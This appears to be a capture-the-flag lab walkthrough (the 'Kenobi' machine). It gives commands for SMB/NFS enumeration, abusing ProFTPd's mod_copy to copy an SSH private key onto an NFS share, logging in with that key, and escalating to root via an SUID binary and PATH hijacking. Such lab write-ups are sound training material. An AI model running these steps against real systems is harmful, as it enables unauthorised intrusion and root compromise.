### Recon
```zsh
nmap ip -vvv
```

### SAMBA enumeration
Samba is the standard Windows interoperability suite of programs for Linux and Unix.

```zsh
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```
to further investigate the `samba` service. 

### getting file from share directory 

```zsh
smbget -R smb://MACHINE_IP/anonymous
```

### getting information from the file obtained
` rpcbind ` - is a system process that plays a crucial role in network communication, particularly for network services that use Remote Procedure Calls (RPC).

```zsh
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
```

`rpcbind` - runs on port 111 in our case

### transferring the key from target to attacker machine
1. First, copy the file to a mount point,  _how?_  There's another service on the server, `ftp` and it's version is `ProFTPd`. This version has a vulnerability to exploit - mod_copy module is one of them.
   
   ```zsh
   nc MACHINE_IP port_number
``` 
This opens up a field to perform copying of our desire. The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the file system to a chosen destination.


```zsh
SITE CPRF path_to_file_to_copy 
SITE CPTO path_to_mount_point
```

2. mounting 
   ```zsh
mkdir /mnt/kenobiNFS  
mount MACHINE_IP:/var /mnt/kenobiNFS
```

take a look at the shared directory, 
```zsh
ls -la /mnt/kenobiNFS
```

3. copying 
   ```zsh
   cp /mnt/kenobiNFS path_of_ur_desire
```

### logging in using ssh

```zsh
ssh -i id_rsa kenobi@MACHINE_IP
```

don't forget to change the permission of `id_rsa` before trying to login, `chmod 600 id_rsa` 

#### `PrivEsc` 

|   |   |   |
|---|---|---|
|**Permission**|**On Files**|**On Directories**|
|SUID Bit|User executes the file with permissions of the _file_ owner|-|
|SGID Bit|User executes the file with the permission of the _group_ owner.|File created in directory gets the same group owner.|
|Sticky Bit|No meaning|Users are prevented from deleting files from other users.|

1. finding `SUID` file 
   ```zsh
   find / -perm -u=s -type f 2>/dev/null
```
The `2>/dev/null` syntax in command-line operations is used to redirect the standard error (stderr) to `/dev/null`, which is a special file that discards all data written to it. This effectively silences any error messages produced by a command. Here’s a breakdown of the syntax:

- `2>`: This indicates that you are redirecting file descriptor 2, which is stderr.
- `/dev/null`: This is a special file that acts like a black hole. Anything written to it is ignored and disappears.
  
2. abuse the path. 
	move to `/tmp` directory, then ...
	
   ```zsh
   echo /bin/sh > ls
   chmod 777 ls
   export PATH=/tmp:$PATH
```
3. run the file you find with `suid` bit set. Now when interacting with this program, you will get a root shell, because to run that the program goes through binaries that are in captured by PATH variable. Therefore, `/bin/sh` got a chance to be executed. 

